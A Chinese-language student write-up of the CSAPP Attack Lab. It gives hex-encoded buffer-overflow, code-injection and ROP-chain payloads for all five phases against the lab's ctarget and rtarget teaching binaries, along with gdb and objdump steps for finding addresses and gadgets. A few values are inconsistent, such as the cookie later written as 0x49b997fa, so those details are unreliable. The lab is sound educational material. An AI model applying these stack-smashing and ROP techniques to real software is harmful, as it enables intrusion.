这个lab我的wsl2一直报错，所以改用docker
好在有前辈建好了docker环境
xieguochao/csapp

Phase1:
objdump -d ctarget > ctarget_disasm.txt
看到getbuf中%rsp减去了0x28，所以buf大小为40
所以我们用40位字符串加上touch1地址0x00000000004017c0即可
注意是小端法
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
./hex2raw < exploit.txt > exploit-raw.txt
./ctarget -q -i exploit-raw.txt

Phase2:
这次要给touch2传入cookie0x59b997fa
所以跳转到buf起点
传入参数后再跳转touch2地址0x004017ec

找buf起点需要用到gdb
gdb -q ctarget
r -q -i exploit-raw.txt
b getbuf
si //减去0x28后才是buf起点
p $rsp //i r也可
发现起点是0x5561dc78

所以汇编如下
movq $0x59b997fa,%rdi
pushq $0x004017ec
ret
用附录方法翻译成二进制得到答案
48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00

Phase3:
这次要传入cookie 59b997fa的ascii码
movq $0x59b99807,%rdi //这里是放text地址 0x5561dc78 + 0d13 = 0x5561dc85
pushq $0x004018fa
ret
.string "59b997fa"

48 c7 c7 85 dc 61 55 68 fa 18
40 00 c3 35 39 62 39 39 37 66
61 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00

这里我们会发现行不通，发现是因为hexmatch改了buf
所以这次我们把ascii码放到地址后面
// 这里text地址 0x5561dc78 + 0d48 = 0x5561dca8
48 c7 c7 a8 dc 61 55 68 fa 18
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00

Phase4:
这里改用rop，就是跑已有的代码来攻击
因为栈随机化了，也已经不可被执行了

首先拼凑一些能用的指令
除了figure3列了一些指令
也可以用gdb disasm 0x4019cc,0x4019dc
gdb disasm 0x4019cd,0x4019dc
这样一个个试
这里找到了0x4019cc的
pop %rax //0x58
nop      //0x90
retq     //0xc3
和位于0x4019a2的
mov %rax,%rdi //0x4989c7
retq          //0xc3
最后填入cookie和touch2地址
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 fa 97
b9 59 00 00 00 00 a2 19 40 00
00 00 00 00 ec 17 40 00 00 00
00 00

Phase5:
这次要传地址，然而地址是随机的
好在我们知道栈里存的地址
0x401a06的
mov %rsp,%rax //0x4889e0
retq          //0xc3
和
0x4019c5的
mov %rax,%rdi //0x4889c7
retq          //0xc3
接下来是把偏移量和地址加起来
很容易想到用rtarget给的add_xy函数
也就是现在要把偏移量放到%rsi
然而找不到一步放进去的，需要一步步倒推
首先是放到%rax
0x4019ab的
pop %rax //0x58
nop      //0x90
retq     //0xc3
然后放到%edx
0x4019dd的
mov %eax,%edx //0x89c2
nop           //0x90
retq          //0xc3
然后放到%ecx
0x401a34的
mov %edx,%ecx //0x89d1
cmp %cl,%cl   //0x38c9
retq          //0xc3
最后放到%esi
0x401a27的
mov %ecx,%esi //0x89ce
cmp %al,%al   //0x38c0
retq          //0xc3
现在可以执行add_xy了0x4019d6
最后把%eax的结果拿回%rdi
0x4019c5的
mov %rax,%rdi //0x4889c7
retq          //0xc3
最后call touch3 0x4018fa
以及放一下cookie 0x49b997fa
数一数偏移量是72也就是0x48

//这次改为8个一行了,方便看一点
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61